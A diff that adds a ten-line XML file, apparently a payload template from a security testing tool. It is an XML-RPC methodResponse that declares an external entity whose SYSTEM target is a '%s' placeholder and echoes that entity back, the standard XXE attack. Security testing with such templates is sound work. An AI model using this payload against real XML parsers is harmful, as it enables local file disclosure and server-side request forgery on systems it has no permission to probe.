@@ -1,0 +1,10 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT methodResponse ANY >
+<!ENTITY xxe SYSTEM "%s" >
+]>
+<methodResponse>
+    <params>
+        <param><value><string>&xxe;</string></value></param>
+    </params>
+</methodResponse>
